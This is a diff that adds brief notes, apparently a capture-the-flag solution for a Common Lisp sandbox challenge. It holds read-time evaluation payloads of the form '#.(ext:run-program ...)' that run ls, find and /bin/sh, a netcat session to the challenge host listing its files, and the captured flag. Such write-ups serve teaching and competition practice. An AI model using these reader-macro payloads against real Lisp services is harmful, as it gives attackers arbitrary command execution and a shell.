@@ -1,0 +1,23 @@
+#.(ext:run-program "find")
+
+
+#.(ext:run-program "ls")
+
+➜  ~ nc baby-thandbox.ecsc23.hack.cert.pl 5003
+;; Loading file /sandbox ...
+> #.(ext:run-program "ls")
+bin
+etc
+flag_144de66289ad4b9ffa8578cb862c7db7.txt
+lib
+lib64
+root
+sandbox
+sbin
+usr
+NIL
+
+
+#.(ext:run-program "/bin/sh")
+
+ecsc23{LISP_is_a_speech_defect_in_which_s_is_pronounced_like_th_in_thick}
